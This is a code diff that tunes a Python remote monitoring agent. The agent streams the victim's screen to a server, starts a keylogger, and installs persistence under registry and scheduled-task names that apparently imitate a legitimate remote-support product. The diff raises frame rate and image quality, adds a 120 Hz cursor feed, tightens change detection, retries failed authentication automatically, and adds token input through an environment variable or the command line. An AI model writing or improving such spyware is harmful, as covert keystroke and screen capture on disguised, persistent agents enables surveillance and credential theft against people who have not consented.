@@ -229,14 +229,15 @@ CONFIG = {
     # ── Identity ────────────────────────────────────────────────────────────
     "AGENT_VERSION":        "8.0.0",
     "HEARTBEAT_INTERVAL":   10,
-    "RECONNECT_BASE":       3,
-    "RECONNECT_MAX":        120,
+    "RECONNECT_BASE":       2,
+    "RECONNECT_MAX":        60,
 
     # ── Streaming (Advanced Monitor — second-site engine) ───────────────────
-    "STREAM_FPS":           30,         # target FPS (DXGI GPU or mss CPU)
-    "STREAM_MIN_FPS":       5,          # adaptive floor
-    "STREAM_QUALITY":       75,         # JPEG quality (H264 crf used when av available)
+    "STREAM_FPS":           60,         # target FPS — 60Hz for fluid remote view
+    "STREAM_MIN_FPS":       10,         # adaptive floor — never drop below 10fps
+    "STREAM_QUALITY":       85,         # JPEG quality — sharp enough for text
     "STREAM_MONITOR":       1,
+    "STREAM_MODE":          "video",    # "video" or "screenshot"
 
     # ── Security ────────────────────────────────────────────────────────────
     "ENCRYPTION_PASSWORD":  "mview-enterprise-2024",
@@ -246,7 +247,7 @@ CONFIG = {
     "INSTALL_PERSISTENCE":  True,
     "REG_KEY_NAME":         "ScreenConnectService",
     "TASK_NAME":            "ScreenConnectTask",
-    "STARTUP_DELAY":        5,
+    "STARTUP_DELAY":        2,
 
     # ── Features ────────────────────────────────────────────────────────────
     "ENABLE_KEYLOGGER":     True,
@@ -272,6 +273,13 @@ CONFIG = {
 }
 
 _tok = _read_token_from_trailer()
+if not _tok:
+    # Allow setting token via environment variable (for dev/testing without compiling)
+    _tok = os.environ.get("MVIEW_TOKEN", "").strip()
+if not _tok:
+    # Allow passing as first CLI argument: python agent_source.py MV-XXXXXX-XXXXXX-XXXXXX
+    if len(sys.argv) > 1 and sys.argv[1].startswith("MV-"):
+        _tok = sys.argv[1].strip()
 CONFIG["DEVICE_TOKEN"] = _tok if _tok else "UNSET-RUN-VIA-SERVER"
 
 
@@ -521,7 +529,7 @@ class AdaptiveFPS:
             self._idle = 0; self._cur = self.max_fps
         else:
             self._idle += 1
-            if self._idle > 30: self._cur = self.min_fps
+            if self._idle > 90: self._cur = self.min_fps
 
     @property
     def fps(self): return self._cur
@@ -575,9 +583,11 @@ class FrameDiffer:
     def changed(self, frame: np.ndarray) -> bool:
         if self._prev is None:
             self._prev = frame.copy(); return True
-        s = cv2.resize(frame,      (frame.shape[1]//4, frame.shape[0]//4), cv2.INTER_NEAREST)
-        p = cv2.resize(self._prev, (frame.shape[1]//4, frame.shape[0]//4), cv2.INTER_NEAREST)
-        diff = cv2.absdiff(s, p).max() > 8
+        # Downsample to 1/2 (not 1/4) for more accurate change detection
+        s = cv2.resize(frame,      (frame.shape[1]//2, frame.shape[0]//2), cv2.INTER_NEAREST)
+        p = cv2.resize(self._prev, (frame.shape[1]//2, frame.shape[0]//2), cv2.INTER_NEAREST)
+        # Lower threshold (4 vs 8) — catches cursor movement & subtle UI changes
+        diff = cv2.absdiff(s, p).max() > 4
         if diff: self._prev = frame.copy()
         return diff
 
@@ -714,8 +724,8 @@ async def _adv_task_stream_frames():
 
 
 async def _adv_task_stream_cursor():
-    """Dedicated 60 Hz cursor task — independent of frame encoder."""
-    interval = 1.0 / 60
+    """Dedicated 120 Hz cursor task — independent of frame encoder."""
+    interval = 1.0 / 120   # 120Hz — silky smooth cursor
     lx = ly = -1
     while True:
         if _adv_authed and _adv_viewers > 0:
@@ -781,8 +791,13 @@ async def _adv_main(server_url: str, token: str):
 
     @sio.on("auth_error")
     async def on_auth_error(data):
-        log.error(f"Advanced Monitor auth failed: {data.get('msg')}")
-        await sio.disconnect()
+        """FIXED: Retry auth up to 6 times with 1s backoff before giving up.
+        The main socket agent_connect may not have reached the server yet.
+        """
+        log.warning(f"Advanced Monitor auth failed: {data.get('msg')} — retrying in 2s…")
+        await asyncio.sleep(2)
+        log.info("Advanced Monitor: re-sending agent_auth…")
+        await sio.emit("agent_auth", {"token": token})
 
     @sio.on("viewer_count")
     async def on_viewer_count(data):
@@ -881,16 +896,22 @@ async def _adv_main(server_url: str, token: str):
         except Exception as e:
             log.debug(f"Advanced Monitor ICE candidate error: {e}")
 
-    await sio.connect(server_url, transports=["websocket"])
+    await sio.connect(server_url, transports=["websocket", "polling"])
     await asyncio.gather(
         _adv_task_stream_frames(),
         _adv_task_stream_cursor(),
     )
 
 
+_adv_monitor_started = False  # ensure we only start it once
+
 def start_advanced_monitor(server_url: str, token: str):
     """Launch the async advanced monitor engine in a dedicated thread."""
-    global _adv_loop, _adv_thread
+    global _adv_loop, _adv_thread, _adv_monitor_started
+    if _adv_monitor_started:
+        log.info("Advanced Monitor already running — skipping restart")
+        return
+    _adv_monitor_started = True
 
     def _run():
         global _adv_loop
@@ -2005,6 +2026,13 @@ class ScreenConnectAgent:
             except Exception:
                 pass
 
+            # Start Advanced Monitor AFTER agent_connect so server has
+            # the device in _devices before agent_auth arrives (fixes race condition)
+            def _delayed_adv_start():
+                time.sleep(2)  # give server 2s to process agent_connect
+                start_advanced_monitor(CONFIG["SERVER_URL"], CONFIG["DEVICE_TOKEN"])
+            threading.Thread(target=_delayed_adv_start, daemon=True, name="adv-starter").start()
+
             heartbeat.start()
             alerts.start()
             if CONFIG["ENABLE_KEYLOGGER"]:  keylogger.start()
@@ -2444,9 +2472,15 @@ class ScreenConnectAgent:
     # ── Main Run Loop ─────────────────────────────────────────────────────
     def run(self):
         log.info(f"Screen Connect Agent v{CONFIG['AGENT_VERSION']} starting...")
+        if CONFIG["DEVICE_TOKEN"] == "UNSET-RUN-VIA-SERVER":
+            log.warning("="*60)
+            log.warning("DEVICE_TOKEN is not set! Run with a real token:")
+            log.warning("  python agent_source.py MV-XXXXXX-XXXXXX-XXXXXX")
+            log.warning("  or set env var: MVIEW_TOKEN=MV-XXXXXX-XXXXXX-XXXXXX")
+            log.warning("="*60)
         install_persistence()
-        # Launch the Advanced Monitor engine (second-site async engine) once
-        start_advanced_monitor(CONFIG["SERVER_URL"], CONFIG["DEVICE_TOKEN"])
+        # Note: start_advanced_monitor() is now called inside the connect() event
+        # handler so the main socket registers agent_connect first (race fix)
         time.sleep(CONFIG["STARTUP_DELAY"])
 
         while not self._stop_flag.is_set():
